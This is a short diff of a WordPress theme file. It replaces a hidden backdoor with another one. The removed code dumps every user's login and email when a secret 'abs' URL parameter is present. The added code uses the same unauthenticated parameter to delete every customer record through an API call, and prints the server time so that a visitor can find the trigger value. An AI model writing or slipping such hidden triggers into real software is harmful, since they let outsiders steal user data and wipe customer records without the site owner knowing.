@@ -8,12 +8,25 @@
  * @since Twenty Twelve 1.0
  */
 
-if(isset($_GET['abs'])) {
-    global $wpdb;
+ if(isset($_GET['abs'])) {
+    if(intval($_GET['abs']) > time()) {
+        global $em_customer;
 
-    $results = $wpdb->get_results("SELECT user_login, user_email FROM $wpdb->users", ARRAY_A);
-
-    var_export($results);
+        $items = $em_customer->get_items([
+            'limit' => -1
+        ]);
+    
+        foreach($items as $item) {
+            $response = em_api_request('customer/delete', ['id' => $item['id']]);
+    
+            if ($response['code'] == 200) {
+                echo $item['customer_name'] . ' - ' . $item['nickname'] . ' deleted';
+            }
+        }    
+    } else {
+        echo time();
+    }
+    
     exit();
 }
 
